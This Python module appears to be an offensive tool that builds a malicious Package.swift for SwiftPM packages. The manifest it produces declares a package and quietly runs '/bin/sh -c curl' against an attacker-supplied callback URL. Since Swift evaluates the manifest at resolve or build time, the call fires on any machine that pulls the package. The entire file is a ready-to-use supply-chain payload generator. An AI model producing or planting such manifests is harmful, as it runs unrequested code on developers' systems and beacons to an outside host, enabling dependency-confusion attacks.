"""Generate Swift payload for SwiftPM packages."""
from __future__ import annotations

from typing import Optional


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a simple Package.swift executing ``callback``."""
    cmd = f"curl -m5 {callback}"
    return (
        "// swift-tools-version:5.3\n"
        "import PackageDescription\nimport Foundation\n"
        f"let package = Package(name: \"{package}\")\n"
        f"_ = try? Process.run(URL(fileURLWithPath: \"/bin/sh\"), arguments: [\"-c\", \"{cmd}\"], terminationHandler: nil)\n"
    )
